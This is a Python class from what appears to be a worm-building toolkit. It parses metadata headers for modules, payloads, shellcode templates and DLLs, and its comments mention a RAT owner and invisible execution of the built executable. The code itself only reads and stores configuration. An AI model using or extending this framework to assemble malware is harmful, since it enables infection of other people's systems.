import os
from typing import Union


class RawLibItem:
    def __init__(self, raw_info_item: object):
        self.fpath = raw_info_item.fpath
        self.separator = raw_info_item.separator
        self.in_separator = raw_info_item.in_separator
        

        # Item name. 'name'
        self.name = None

        # Item description. #   'info'
        self.info = ""

        # Item Library types. # 'itemType'
        self.itemType = None

        # Item tags. #  'itemTags'
        # WIN - Works only on Windows
        # LIN - Works only on Linux
        # LW - Works on Linux and Windows
        # PyS - Python standard script (standard library)
        # PyEx - Python script with external library
        # SM - Support Module
        self.itemTags = []

        # HIVE section module type. #   'hiveType'
        # PySM - Python module with std library
        # PyExM - Python module with external library
        # PySh - Python shadow
        # LIB - Static library
        # DLL - DLL library
        # SCode - Shellcode Template
        #   hiveType##name1##name2##name3 ... etc
        self.hiveType = []

        # acceptable HIVE modules. #    'typeAccept'
        # PySM - Python module with std library
        # PyExM - Python module with external library
        # SCode - Shellcode template
        # LIB - Static library
        # DLL - DLL library
        #   typeAccept##name1##name2##name3 .... etc
        self.typeAccept = []

        # Module type from the system's point of view. #    'fileType'
        # DLL, LIB etc.
        # LIB - static Library
        # DLL - Dynamic library
        # PY_MOD - Python 'hive module' - Without this tag, the module will not be added to "_PY_MODULE"
        #   fileType##DLL
        self.fileType = None

        # Item is broken. Dont add to library. #    "FLAG_broken"
        self.FLAG_broken = False

        # Item source code language
        # Python, Nasm, cpp, c, None
        #   lang##Python
        self.lang = "Unknown"

        # Module owner. #   'owner'
        #   owner##Rat
        self.owner = None

        # Worm Process. #   'Wprocess'
        # Wprocess##[process_name]
        self.Wprocess = None

        # Put Module to ready app directory
        # Determines whether the built module will still be needed by the worm and copies it to a special directory
        self.readyApp = False

        ######## VARIABLES ##########
        # Var##[name]##[value]##[description]##optional[type]   - set worm variable
        # Var##[name]##$[default_var_name]##[description]##optional[type]   - The initial value will be taken from the 'default' variables.
        # Var##[name]##_NULL##[description]##optional[type]     - Creating a variable without an initial value
        #
        # Reserved variable names:
        # 'EXEC_SHOW' - Determines whether the executable file will run in the console or will be invisible as a 'gui'.
        # '_RANDOM' - A special value denoting 'random selection' passed to tools.
        # ex: Var##EXEC_SHOW##gui##[description]##optional[type]
        self.Var = {}


        ############### FOODS ###############
        # 'FOOD' is built before modules and added to variables
        # foodAdd##[food_name]##[var_name] - Add food to variables
        self.foodReq = {}

        

        ######################################################################################################################

        ####### REQUIRED MODULES, FILES ETC #####################
        # Modules, files, etc. required for the module to function
        #
        # reqMod##[name1]##[name2]... etc   - Required modules. Searches 'modules' and 'support'
        self.reqMod = []

 

        ################################################################################################

        ############### Special options for the module ######################
        # Compiler selection for this module only
        # modCompiler##[compiler_name]
        self.modCompiler = None

        # Module construction process. #    'modProcess'
        # List of build processes the module will go through.
        # modProcess##[proc_name1]##[proc_name2]... etc
        self.modProcess = []

        # Name the module will take after the building process. #   'modName'
        # modName##myHeader.h
        self.modName = None


        ######################################################################################

        ################################### DLL FILES ###############################################
        # Building the DEF file
        # List of functions exported to the DEF file #  'dllDef'
        # dllDef##[func_name1]##[func_name2].... etc
        self.dllDef = []


        ##################################################################################################

        ################# INCLUDE FILES #########################################
        # All additional code files
        # inFile##[sfile_name]##[code_name]
        # ex: inFile##MyLib##my_code.h
        self.inFile = {}
        # The name of the attached file assigned by the system
        self.supportFileCodeName = None

        ###################### ADD TO COMPILER COMMAND ########################################
        # Decides whether a given file will be added to the compiler command. # 'addNameComp'
        # addNameComp##True
        self.addNameComp = False

        # Decides whether to add the final module file to the main compilation. #   'addExeComp'
        # addExeComp##True
        self.addExeComp = False

        # Worm compiler name
        self.wormCompiler = None

        ############################### PAYLOADS ##########################################
        # PAYLOADS of various types, payloads work differently than modules.
        # PAYLOAD is created before all modules and code. It is then added to the variables.
        #
        # Preparing space for PAYLOAD #     'payloadSpace'
        # payloadSpace##[payload_name]##[payload_info]
        self.payloadSpace = {}

        # Payload construction process #    'payloadProcess'
        # Placed in the parent module.
        # In the 'payload' module, the 'modProcess' process is used first, then the 'payloadProcess' process from the parent module is used
        # payloadProcess##[payload_name]##[process1]##[process2]... etc
        self.payloadProcess = {}


        ####################################################################################

        ########################### PYTHON OPTIONS, MODULES ETC ###############################

        # Python Modules #  'pyType'
        # Python module type:
        # 'master' - the worm's main code,
        # 'module' - the module code, will be placed in a random location,
        # 'loader' - special code that will be executed first
        # pyType##[module_type]
        # ex: pyType##module
        self.pyType = None

        # Python Import #   'pyImportHold'
        # Specifies whether the added Python module will not place the 'import' section at the beginning of the file, but only at the module.
        # pyImportHold##True
        self.pyImportHold = False

        # Python Module name in code. # 'pyModName'
        # Specifies the module name used in the code. If not present, the module name will be used.
        # pyModName##[mod_name]
        self.pyModName = None

        ############################################################################################

        ######################### SHADOWS ###################################
        # Specifies whether code from the 'shadow' module should be additionally rendered.
        # shadowRender##[bool]
        # ex: shadowRender##True
        self.shadowRender = False

        ######## Other FLAG #############
        # module changes to support type
        self.FLAG_support = False

        #######################################################
        self.__raw_code = None

        


    @property
    def raw_code(self) -> str:
        if self.__raw_code:
            return self.__raw_code
        rcode = ""
        try:
            with open(self.fpath, "r") as file:
                for line in file.readlines():
                    if line.startswith(self.separator):
                        continue
                    rcode += line
        except:
            return ""
        
        return rcode

    @property
    def moduleTags(self) -> list:
        tags = set()
        if self.fileType:
            tags.add(self.fileType)
        tags.update(self.itemTags)
        tags.update(self.hiveType)
        return list(tags)


    def load_item_data(self) -> list:
        data = []
        try:
            with open(self.fpath, "r") as file:
                raw = file.read()
        except:
            self.FLAG_broken = True
            return []
        for line in raw.splitlines():
            if line == f"{self.separator}HEADERS_END":
                break
            if line.startswith(self.separator):
                data.append(line.lstrip(self.separator).rstrip("\n"))
        return data
    
    # Added code. From now on, 'raw_code' will return this code.
    def addCode(self, code: str) -> None:
        self.__raw_code = code
